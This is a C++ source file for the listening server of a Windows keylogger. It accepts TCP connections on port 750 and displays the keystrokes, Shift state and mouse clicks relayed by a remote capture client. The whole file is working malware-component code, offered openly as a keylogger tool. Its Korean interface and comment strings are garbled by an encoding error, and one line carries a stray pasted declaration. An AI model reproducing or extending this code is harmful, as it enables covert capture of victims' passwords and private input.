#include <iostream>
#include <winsock2.h>
#include <windows.h>

#include <conio.h>

#include "RequestCode.h"
#include "textcolor.h"

using namespace std;

const char* KeyRender(char temp);
void textcolor(int foreground, int background);


int main()
{
    WSADATA wsa;
    SOCKET binding_socket, client_socket;
    struct sockaddr_in server, client_addr;
    int client_addr_size;

    char buff[50]="";

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        cerr << " �ʱ�ȭ ����. �����ڵ�: " << WSAGetLastError();
        return 1;
    }
    cout << " �ʱ�ȭ ��..." << endl;

    if((binding_socket = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        cerr << " ���� ���� ����. �����ڵ�: " << WSAGetLastError();
        WSACleanup();
        getch();
        return 1;
    }
    cout << " ���� ���� ����" << endl;

    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_family = AF_INET;
    server.sin_port = htons( 750 );

    int nSockOpt = 1;
    setsockopt(binding_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&nSockOpt, sizeof(nSockOpt));
    if (-1 == bind (binding_socket, (struct sockaddr *) &server, sizeof (server)))
    {
        cerr << " ���ε� ����";
        WSACleanup();
        closesocket(binding_socket);
        getch();
        exit (1);
    }
    cout << " ���ε� ����" << endl;

    if (-1 == listen (binding_socket, 5))
    {
        cerr << " Listen ����";
        WSACleanup();
        closesocket(binding_socket);
        getch();
        exit (1);
    }
    cout << " ���ε� ���Ͽ��� ���� ��û�� ��ٸ��� ��..." << endl;
    cout << endl;

    client_addr_size = sizeof (client_addr);

    system("cls");
    system("mode con cols=95 lines=32");

    // �ѤѤѤѤѤѤѤ� ��� ���̵� �ѤѤѤѤѤѤѤѤ�

    textcolor(LIGHTGREEN, BLACK);
    cout << " KeyLogger(Server) 64bit Windows Edition [1.0.1]" << endl;
    cout << " Copyright �� 2018 Wonjae Ji. All rights reserved." << endl;
    cout << endl;
    cout << " ########################################## ���� ##########################################" << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    textcolor(LIGHTCYAN, BLACK);
    cout << " Left butt Pressed: ?, ?";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : ����Ÿ���� ���콺 ���ʹ�ư�� Ŭ���ߴٴ� ��" << endl;
    textcolor(LIGHTCYAN, BLACK);
    cout << " Right butt Presssed ?, ?";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : ����Ÿ���� ���콺 �����ʹ�ư�� Ŭ���ߴٴ� ��" << endl;
    cout << endl;
    textcolor(LIGHTCYAN, BLACK);
    cout << " TOTOS";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : Ű����� 't', 'o', 't', 'o', 's' �� �Է��ߴٴ� ��" << endl;
    cout << " ";
    textcolor(BLACK, LIGHTGRAY);
    cout << "TOTOS";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : ����Ʈ�� ���� ���¿��� Ű����� 't', 'o', 't', 'o', 's' �� �Է��ߴٴ� ��" << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    cout << " ############################################################################################" << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    cout << endl;

    // �ѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤѤ�

    textcolor(LIGHTCYAN, BLACK);

    const char* out;
    while(true)
    {
        if ( (client_socket = accept (binding_socket, (struct sockaddr *) &client_addr, &client_addr_size)) == -1)
        {
            cerr << " ���� ����";
        }

        memset(buff, 0, 50);void textcolor(int foreground, int background);

        if(recv(client_socket, buff, 50, 0) < 0)
        {
            cerr << " ���� ����" << endl;
            getch();
            return 0;
        }

        if(strlen(buff) > 1) // Key Press �̿��� �̺�Ʈ�� ���
        {
            if(!strcmp(buff, "[/Shift]"))
            {
                textcolor(LIGHTCYAN, BLACK);
                continue;
            }
            cout << buff;
            continue;
        }
        else if(buff[0] == '') // ����Ʈ�� ��������
        {
            textcolor(BLACK, LIGHTGRAY); // ���ڻ��� ���� ��� �ٲ�.
            continue;
        }
        out = KeyRender(buff[0]);
        cout << out;

    }
    return 0;
}
